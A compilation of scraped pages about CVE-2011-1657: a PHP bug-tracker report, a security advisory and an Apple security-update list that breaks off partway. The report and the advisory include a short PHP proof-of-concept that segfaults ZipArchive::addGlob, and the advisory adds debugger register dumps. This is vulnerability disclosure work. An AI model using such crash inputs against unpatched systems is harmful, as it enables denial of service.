=== Content from bugs.php.net_bc663b04_20250126_031731.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Sec Bug](bug.php?id=54681) #54681 | addGlob() crashes on invalid flags | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2011-05-07 00:58 UTC | Modified: | 2011-08-22 11:44 UTC |  | | From: | cxib at securityreason dot com | Assigned: | [pajoye](search.php?cmd=display&assign=pajoye) ([profile](https://people.php.net/pajoye)) | | Status: | Closed | Package: | [\*General Issues](search.php?cmd=display&package_name[]=%2AGeneral+Issues) | | PHP Version: | 5.3.6 | OS: | NetBSD | | Private report: | No | CVE-ID: | *None* |   View [Developer](bug.php?id=54681&edit=1) [Edit](bug.php?id=54681&edit=2)   **[2011-05-07 00:58 UTC] cxib at securityreason dot com** ``` Description: ------------ For first function addGlob and addPattern are not described in manual <http://pl2.php.net/manual/en/class.ziparchive.php>  ext/zip/php_zip.c 1629 	/* 1 == glob, 2==pcre */ 1630 	if (type == 1) { 1631 	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s|la", 1632 	&pattern, &pattern_len, &flags, &options) == FAILURE) { 1633 	return; 1634 	} 1635 	} else { 1636 	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s|sa", 1637 	&pattern, &pattern_len, &path, &path_len, &options) == FAILURE) { 1638 	return; 1639 	} 1640 	} 1641  There are no GLOB flags validation like in php/glob(). So limit flags only to GLOB_MARK|GLOB_NOSORT|GLOB_NOCHECK|GLOB_NOESCAPE|GLOB_BRACE|GLOB_ONLYDIR|GLOB_ERR  like <http://pl2.php.net/manual/en/function.glob.php>      * GLOB_MARK - Adds a slash to each directory returned     * GLOB_NOSORT - Return files as they appear in the directory (no sorting)     * GLOB_NOCHECK - Return the search pattern if no files matching it were found     * GLOB_NOESCAPE - Backslashes do not quote metacharacters     * GLOB_BRACE - Expands {a,b,c} to match 'a', 'b', or 'c'     * GLOB_ONLYDIR - Return only directory entries which match the pattern     * GLOB_ERR - Stop on read errors (like unreadable directories), by default errors are ignored.    Test script: --------------- The crash come, when we run libc/glob(3) function with incorrect flag. Tested also on linux/ubuntu and (netbsd)  cx@cx64:~$ php -v PHP 5.3.3-1ubuntu9.3 with Suhosin-Patch (cli) (built: Jan 12 2011 16:07:38) Copyright (c) 1997-2009 The PHP Group Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies cx@cx64:~$ uname -a Linux cx64 2.6.35-28-generic #49-Ubuntu SMP Tue Mar 1 14:39:03 UTC 2011 x86_64 GNU/Linux cx@cx64:/www$ cat zip.php <?php  unlink("empty.zip");  fopen("empty.zip","a");  $nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob(str_repeat("*",333333),0x39); ?>cx@cx64:/www$ php zip.php Segmentation fault  Actual result: -------------- Segmentation fault   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2011-05-07 01:00 UTC] [felipe@php.net](//people.php.net/felipe)** -Type: Bug +Type: Security -Private report: No +Private report: Yes **[2011-05-07 01:27 UTC] cxib at securityreason dot com** ``` use CVE-2011-1657  ``` **[2011-05-07 02:26 UTC] [pajoye@php.net](//people.php.net/pajoye)** -Status: Open +Status: Assigned -Assigned To: +Assigned To: pajoye **[2011-05-07 02:26 UTC] [pajoye@php.net](//people.php.net/pajoye)** -CVE-ID: +CVE-ID: 2011-1657 **[2011-05-07 03:58 UTC] [felipe@php.net](//people.php.net/felipe)** -Summary: addGlob addPattern buffer overflow +Summary: addGlob() crashes on invalid flags **[2011-05-07 03:58 UTC] [felipe@php.net](//people.php.net/felipe)** ``` Hi, this is not a buffer overflow issue. But an error on glob() due the invalid (or unsupported) flags.  Anyway, the checks from glob() were added in the addGlob() method.   Thanks.  ``` **[2011-05-07 03:58 UTC] [felipe@php.net](//people.php.net/felipe)** ``` Automatic comment from SVN on behalf of felipe Revision: <http://svn.php.net/viewvc/?view=revision&amp;revision=310814> Log: - Fixed [bug #54681](bug.php?id=54681) (addGlob() crashes on invalid flags)  ``` **[2011-05-07 03:58 UTC] [felipe@php.net](//people.php.net/felipe)** -Status: Assigned +Status: Closed **[2011-05-07 03:58 UTC] [felipe@php.net](//people.php.net/felipe)** ``` This bug has been fixed in SVN.  Snapshots of the sources are packaged every three hours; this change will be in the next snapshot. You can grab the snapshot at <http://snaps.php.net/>.   Thank you for the report, and for helping us make PHP better.    ``` **[2011-05-07 03:59 UTC] [felipe@php.net](//people.php.net/felipe)** ``` Automatic comment from SVN on behalf of felipe Revision: <http://svn.php.net/viewvc/?view=revision&amp;revision=310815> Log: - BFN #54681  ``` **[2011-05-07 21:16 UTC] cxib at securityreason dot com** ``` I agree with you that the issue is due the invalid (or unsupported) flags. Consequently, it can lead to many others symptoms. With glob(3) function in linux, we can get stack exhaustion like was discovered in fnmatch/php.   <http://svn.php.net/viewvc?view=revision&revision=298881>  However, in my opinion, the GNU was responsible for this bug. Not PHP.   There is a big difference between glob (3) in the Linux and BSD. However, uncontrolled 'flag' parameter to the function glob in both cases will generate different susceptibility.  Thanks for fix  ``` **[2011-08-20 14:52 UTC] max at cxib dot net** ``` poc  <http://pastebin.com/RTmWQaDY>  ``` **[2011-08-21 11:54 UTC] [pajoye@php.net](//people.php.net/pajoye)** ``` @max at cxib dot net  Still happening with the fix?  ``` **[2011-08-22 11:44 UTC] cxib at securityreason dot com** ``` no. just reported poc to confirm security problem under bsd  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Sun Jan 26 03:01:29 2025 UTC |



=== Content from cxsecurity.com_a402caba_20250126_031731.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_a50e1c64_20250124_201710.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **PHP 5.3.6 ZipArchive invalid use glob(3)** **2011-08-19 / 2012-03-12** Credit:  **[Maksymilian Arciemowicz](https://cxsecurity.com/author/Maksymilian%2BArciemowicz/1/)**  Risk: **Medium** Local: ****Yes**** Remote: **No** CVE: **[CVE-2011-1657](https://cxsecurity.com/cveshow/CVE-2011-1657/ "Click to see CVE-2011-1657")** CWE: **[CWE-399](https://cxsecurity.com/cwe/CWE-399 "Click to see CWE-399")**  CVSS Base Score: **5/10** Impact Subscore: **2.9/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **None** Integrity impact: **None** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

[ PHP 5.3.6 ZipArchive invalid use glob(3) ]
Author: Maksymilian Arciemowicz
http://cxib.net/
Date:
- Dis.: 01.04.2011
- Pub.: 19.08.2011
CVE: CVE-2011-1657
Affected Software (verified):
PHP 5.3.6 and prior
Fixed:
PHP 5.3.7
--- 0.Description ---
PHP is a general-purpose scripting language originally designed for web development to produce dynamic web pages. For this purpose, PHP code is embedded into the HTML source document and interpreted by a web server with a PHP processor module, which generates the web page document. It also has evolved to include a command-line interface capability and can be used in standalone graphical applications.
ZipArchive
This extension enables you to transparently read or write ZIP compressed archives and the files inside them.
--- 1. PHP 5.3.6 ZipArchive invalid use glob(3) ---
Functions like addGlob and addPattern are not described in documentation. Anyway we can call to ZipArchive::addGlob and ZipArchive::addPattern in PHP 5.3.6
http://pl2.php.net/manual/en/class.ziparchive.php
let's see ext/zip/php\_zip.c
531 if (0 != (ret = glob(pattern, flags & GLOB\_FLAGMASK, NULL, &globbuf))) {
...
1629 /\* 1 == glob, 2==pcre \*/
1630 if (type == 1) {
1631 if (zend\_parse\_parameters(ZEND\_NUM\_ARGS() TSRMLS\_CC, "s|la",
1632 &pattern, &pattern\_len, &flags, &options) == FAILURE) {
1633 return;
1634 }
1635 } else {
1636 if (zend\_parse\_parameters(ZEND\_NUM\_ARGS() TSRMLS\_CC, "s|sa",
1637 &pattern, &pattern\_len, &path, &path\_len, &options) == FAILURE) {
1638 return;
1639 }
1640 }
1641
invalid &flags may provide to crash. To use flags like GLOB\_ALTDIRFUNC, we should first declare gl\_opendir, gl\_closedir, gl\_lstat, gl\_stat. In PHP we only have
508 glob\_t globbuf;
...
530 globbuf.gl\_offs = 0;
531 if (0 != (ret = glob(pattern, flags & GLOB\_FLAGMASK, NULL, &globbuf))) {
for addglob() there are no GLOB flags validation like in php/glob(). Only flags like GLOB\_MARK|GLOB\_NOSORT|GLOB\_NOCHECK|GLOB\_NOESCAPE|GLOB\_BRACE|GLOB\_ONLYDIR|GLOB\_ERR should be allowed:
- GLOB\_MARK - Adds a slash to each directory returned
- GLOB\_NOSORT - Return files as they appear in the directory (no sorting)
- GLOB\_NOCHECK - Return the search pattern if no files matching it were found
- GLOB\_NOESCAPE - Backslashes do not quote metacharacters
- GLOB\_BRACE - Expands {a,b,c} to match 'a', 'b', or 'c'
- GLOB\_ONLYDIR - Return only directory entries which match the pattern
- GLOB\_ERR - Stop on read errors (like unreadable directories), by default errors are ignored.
---linux/ubuntu---
cx@cx64:~$ php -v
PHP 5.3.3-1ubuntu9.3 with Suhosin-Patch (cli) (built: Jan 12 2011 16:07:38)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
cx@cx64:~$ uname -a
Linux cx64 2.6.35-28-generic #49-Ubuntu SMP Tue Mar 1 14:39:03 UTC 2011 x86\_64 GNU/Linux
cx@cx64:/www$ cat zip.php
<?php
unlink("empty.zip");
fopen("empty.zip","a");
$nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("\*",333333),0x39);
?>cx@cx64:/www$ php zip.php
Segmentation fault
---linux/ubuntu---
Tested with NetBSD glob(3) implementation (netbsd 5.1 and PHP 5.3.6)
---bsd/netbsd---
unlink("empty.zip"); fopen("empty.zip","a"); $nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("A",1000000),0x39);
Program received signal SIGSEGV, Segmentation fault.
0xbb86bb12 in realloc () from /usr/lib/libc.so.12
(gdb) i r
eax 0x410041 4259905
ecx 0xc 12
edx 0xbfb00000 -1078984704
ebx 0xbb8c81f4 -1148419596
esp 0xbfbfa980 0xbfbfa980
ebp 0xbfbfa9d8 0xbfbfa9d8
esi 0xfc000 1032192
edi 0x0 0
eip 0xbb86bb12 0xbb86bb12 <realloc+118>
(gdb) x/i $eip
0xbb86bb12 <realloc+118>: mov 0x8(%eax),%edi
(gdb) x/i $eax
0x410041: Cannot access memory at address 0x410041
---bsd/netbsd---
and now try 'B'
---bsd/netbsd---
unlink("empty.zip");
fopen("empty.zip","a");
$nx=new
ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("B",1000000),0x39);
(gdb) x/i $eip
0xbb86bb12 <realloc+118>: mov 0x8(%eax),%edi
(gdb) x/i $eax
0x420042: Cannot access memory at address 0x420042
---bsd/netbsd---
A we get mov 0x8(%eax),%edi where eax=0x410041
B we get mov 0x8(%eax),%edi where eax=0x420042
and once again for eax=0x0
---bsd/netbsd---
$nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob("aa",0x39);
Program received signal SIGSEGV, Segmentation fault.
0xbb8e2960 in pthread\_mutex\_lock () from /usr/lib/libpthread.so.0
(gdb) bt
#0 0xbb8e2960 in pthread\_mutex\_lock () from /usr/lib/libpthread.so.0
#1 0xbb86a43a in \_malloc\_prefork () from /usr/lib/libc.so.12
#2 0xbb86bb9c in realloc () from /usr/lib/libc.so.12
#3 0xbb83610b in \_\_globfree30 () from /usr/lib/libc.so.12
#4 0xbb836cb7 in \_\_globfree30 () from /usr/lib/libc.so.12
#5 0xbb8372d9 in \_\_glob30 () from /usr/lib/libc.so.12
#6 0x083b1fe3 in php\_XML\_ParserFree ()
#7 0x083b45b7 in php\_XML\_ParserFree ()
#8 0x083b485f in php\_XML\_ParserFree ()
#9 0x0846f4b6 in execute ()
#10 0x084703c8 in execute ()
#11 0x0846e42d in execute ()
#12 0x08442b5a in zend\_execute\_scripts ()
#13 0x083c776b in php\_execute\_script ()
#14 0x08515c23 in zend\_get\_zval\_ptr\_ptr ()
#15 0x08067eb4 in \_\_\_start ()
#16 0x08067e17 in \_start ()
---bsd/netbsd---
to get other crash point, change 0x39 to 0x40 or use addPattern() with special crafted zip files.
---addPattern()---
$nx=new
ZipArchive();$nx->open("empty.zip");$nx->addPattern(str\_repeat("A",1));
0x083b21c4 in php\_XML\_ParserFree ()
---addPattern()---
--- 2. Fix ---
PHP 5.3.7
http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
PR/44959: Henning Petersen: glob forgets to closedir on out of space condition.
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/glob.c.diff?r1=1.29&r2=1.30&only\_with\_tag=MAIN&f=h
--- 3. Greets ---
Felipe
--- 4. Contact ---
Author: Maksymilian Arciemowicz

**##### References:**

 http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/glob.c.diff?r1=1.29&r2=1.30&only\_with\_tag=MAIN&f=h
http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
http://svn.php.net/viewvc/?view=revision&revision=310814
https://bugs.php.net/bug.php?id=54681
http://support.apple.com/kb/HT5130
http://lists.apple.com/archives/security-announce/2012/Feb/msg00000.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2011080235)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_eaddb593_20250126_031731.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_4a3af95e_20250126_031730.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from support.apple.com_f2a5ef5f_20250124_201711.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of OS X Lion v10.7.3 and Security Update 2012-001

This document describes the security content of OS X Lion v10.7.3 and Security Update 2012-001.

This document describes the security content of OS X Lion v10.7.3 and Security Update 2012-001, which can be downloaded and installed via [Software Update](http://support.apple.com/kb/HT1338) preferences, or from [Apple Downloads](https://support.apple.com/en_US/downloads).

For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available. To learn more about Apple Product Security, see the [Apple Product Security](http://www.apple.com/support/security/) website.

For information about the Apple Product Security PGP Key, see "[How to use the Apple Product Security PGP Key](http://support.apple.com/kb/HT1620)."

Where possible, [CVE IDs](http://cve.mitre.org/about/) are used to reference the vulnerabilities for further information.

To learn about other Security Updates, see "[Apple Security Updates](http://support.apple.com/kb/HT1222)".

## OS X Lion v10.7.3 and Security Update 2012-001

* **Address Book**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: An attacker in a privileged network position may intercept CardDAV data

  Description: Address Book supports Secure Sockets Layer (SSL) for accessing CardDAV. A downgrade issue caused Address Book to attempt an unencrypted connection if an encrypted connection failed. An attacker in a privileged network position could abuse this behavior to intercept CardDAV data. This issue is addressed by not downgrading to an unencrypted connection without user approval.

  CVE-ID

  CVE-2011-3444 : Bernard Desruisseaux of Oracle Corporation

* **Apache**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Multiple vulnerabilities in Apache

  Description: Apache is updated to version 2.2.21 to address several vulnerabilities, the most serious of which may lead to a denial of service. Further information is available via the Apache web site at <http://httpd.apache.org/>

  CVE-ID

  CVE-2011-3348

* **Apache**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: An attacker may be able to decrypt data protected by SSL

  Description: There are known attacks on the confidentiality of SSL 3.0 and TLS 1.0 when a cipher suite uses a block cipher in CBC mode. Apache disabled the 'empty fragment' countermeasure which prevented these attacks. This issue is addressed by providing a configuration parameter to control the countermeasure and enabling it by default.

  CVE-ID

  CVE-2011-3389

* **ATS**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Opening a maliciously crafted font in Font Book may lead to an unexpected application termination or arbitrary code execution

  Description: A memory management issue existed in ATS' handling of data-font files when opened by Font Book.

  CVE-ID

  CVE-2011-3446 : Will Dormann of the CERT/CC

* **CFNetwork**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Visiting a maliciously crafted website may lead to the disclosure of sensitive information

  Description: An issue existed in CFNetwork's handling of malformed URLs. When accessing a maliciously crafted URL, CFNetwork could send the request to an incorrect origin server. This issue does not affect systems prior to OS X Lion.

  CVE-ID

  CVE-2011-3246 : Erling Ellingsen of Facebook

* **CFNetwork**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Visiting a maliciously crafted website may lead to the disclosure of sensitive information

  Description: An issue existed in CFNetwork's handling of malformed URLs. When accessing a maliciously crafted URL, CFNetwork could send unexpected request headers. This issue does not affect systems prior to OS X Lion.

  CVE-ID

  CVE-2011-3447 : Erling Ellingsen of Facebook

* **ColorSync**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8

  Impact: Viewing a maliciously crafted image with an embedded ColorSync profile may lead to an unexpected application termination or arbitrary code execution

  Description: An integer overflow existed in the handling of images with an embedded ColorSync profile, which may lead to a heap buffer overflow. This issue does not affect OS X Lion systems.

  CVE-ID

  CVE-2011-0200 : binaryproof working with TippingPoint's Zero Day Initiative

* **CoreAudio**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8

  Impact: Playing maliciously crafted audio content may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in the handling of AAC encoded audio streams. This issue does not affect OS X Lion systems.

  CVE-ID

  CVE-2011-3252 : Luigi Auriemma working with TippingPoint's Zero Day Initiative

* **CoreMedia**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted movie file may lead to an unexpected application termination or arbitrary code execution

  Description: A heap buffer overflow existed in CoreMedia's handling of H.264 encoded movie files.

  CVE-ID

  CVE-2011-3448 : Scott Stender of iSEC Partners

* **CoreText**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing or downloading a document containing a maliciously crafted embedded font may lead to an unexpected application termination or arbitrary code execution

  Description: A use after free issue existed in the handling of font files.

  CVE-ID

  CVE-2011-3449 : Will Dormann of the CERT/CC

* **CoreUI**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Visiting a malicious website may lead to an unexpected application termination or arbitrary code execution

  Description: An unbounded stack allocation issue existed in the handling of long URLs. This issue does not affect systems prior to OS X Lion.

  CVE-ID

  CVE-2011-3450 : Ben Syverson

* **curl**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: A remote server may be able to impersonate clients via GSSAPI requests

  Description: When doing GSSAPI authentication, libcurl unconditionally performs credential delegation. This issue is addressed by disabling GSSAPI credential delegation.

  CVE-ID

  CVE-2011-2192

* **Data Security**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: An attacker with a privileged network position may intercept user credentials or other sensitive information

  Description: Two certificate authorities in the list of trusted root certificates have independently issued intermediate certificates to DigiCert Malaysia. DigiCert Malaysia has issued certificates with weak keys that it is unable to revoke. An attacker with a privileged network position could intercept user credentials or other sensitive information intended for a site with a certificate issued by DigiCert Malaysia. This issue is addressed by configuring default system trust settings so that DigiCert Malaysia's certificates are not trusted. We would like to acknowledge Bruce Morton of Entrust, Inc. for reporting this issue.

* **dovecot**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: An attacker may be able to decrypt data protected by SSL

  Description: There are known attacks on the confidentiality of SSL 3.0 and TLS 1.0 when a cipher suite uses a block cipher in CBC mode. Dovecot disabled the 'empty fragment' countermeasure which prevented these attacks. This issue is addressed by enabling the countermeasure.

  CVE-ID

  CVE-2011-3389 : Apple

* **filecmds**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Decompressing a maliciously crafted compressed file may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in the 'uncompress' command line tool.

  CVE-ID

  CVE-2011-2895

* **ImageIO**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted TIFF file may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in libtiff's handling of ThunderScan encoded TIFF images. This issue is addressed by updating libtiff to version 3.9.5.

  CVE-ID

  CVE-2011-1167

* **ImageIO**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Multiple vulnerabilities in libpng 1.5.4

  Description: libpng is updated to version 1.5.5 to address multiple vulnerabilities, the most serious of which may lead to arbitrary code execution. Further information is available via the libpng website at <http://www.libpng.org/pub/png/libpng.html>

  CVE-ID

  CVE-2011-3328

* **Internet Sharing**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: A Wi-Fi network created by Internet Sharing may lose security settings after a system update

  Description: After updating to a version of OS X Lion prior to 10.7.3, the Wi-Fi configuration used by Internet Sharing may revert to factory defaults, which disables the WEP password. This issue only affects systems with Internet Sharing enabled and sharing the connection to Wi-Fi. This issue is addressed by preserving the Wi-Fi configuration during a system update.

  CVE-ID

  CVE-2011-3452 : an anonymous researcher

* **Libinfo**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Visiting a maliciously crafted website may lead to the disclosure of sensitive information

  Description: An issue existed in Libinfo's handling of hostname lookup requests. Libinfo could return incorrect results for a maliciously crafted hostname. This issue does not affect systems prior to OS X Lion.

  CVE-ID

  CVE-2011-3441 : Erling Ellingsen of Facebook

* **libresolv**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Applications that use OS X's libresolv library may be vulnerable to an unexpected application termination or arbitrary code execution

  Description: An integer overflow existed in the parsing of DNS resource records, which may lead to heap memory corruption.

  CVE-ID

  CVE-2011-3453 : Ilja van Sprundel of IOActive

* **libsecurity**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Some EV certificates may be trusted even if the corresponding root has been marked as untrusted

  Description: The certificate code trusted a root certificate to sign EV certificates if it was on the list of known EV issuers, even if the user had marked it as 'Never Trust' in Keychain. The root would not be trusted to sign non-EV certificates.

  CVE-ID

  CVE-2011-3422 : Alastair Houghton

* **OpenGL**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Applications that use OS X's OpenGL implementation may be vulnerable to an unexpected application termination or arbitrary code execution

  Description: Multiple memory corruption issues existed in the handling of GLSL compilation.

  CVE-ID

  CVE-2011-3457 : Chris Evans of the Google Chrome Security Team, and Marc Schoenefeld of the Red Hat Security Response Team

* **PHP**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Multiple vulnerabilities in PHP 5.3.6

  Description: PHP is updated to version 5.3.8 to address several vulnerabilities, the most serious of which may lead to arbitrary code execution. Further information is available via the PHP web site at <http://www.php.net>

  CVE-ID

  CVE-2011-1148

  CVE-2011-1657

  CVE-2011-1938

  CVE-2011-2202

  CVE-2011-2483

  CVE-2011-3182

  CVE-2011-3189

  CVE-2011-3267

  CVE-2011-3268

* **PHP**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted PDF file may lead to an unexpected application termination or arbitrary code execution

  Description: A memory corruption issue existed in FreeType's handling of Type 1 fonts. This issue is addressed by updating FreeType to version 2.4.7. Further information is available via the FreeType site at http://www.freetype.org/

  CVE-ID

  CVE-2011-3256 : Apple

* **PHP**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Multiple vulnerabilities in libpng 1.5.4

  Description: libpng is updated to version 1.5.5 to address multiple vulnerabilities, the most serious of which may lead to arbitrary code execution. Further information is available via the libpng website at <http://www.libpng.org/pub/png/libpng.html>

  CVE-ID

  CVE-2011-3328

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Opening a maliciously crafted MP4 encoded file may lead to an unexpected application termination or arbitrary code execution

  Description: An uninitialized memory access issue existed in the handling of MP4 encoded files.

  CVE-ID

  CVE-2011-3458 : Luigi Auriemma and pa\_kt both working with TippingPoint's Zero Day Initiative

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted movie file may lead to an unexpected application termination or arbitrary code execution

  Description: A signedness issue existed in the handling of font tables embedded in QuickTime movie files.

  CVE-ID

  CVE-2011-3248 : Luigi Auriemma working with TippingPoint's Zero Day Initiative

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

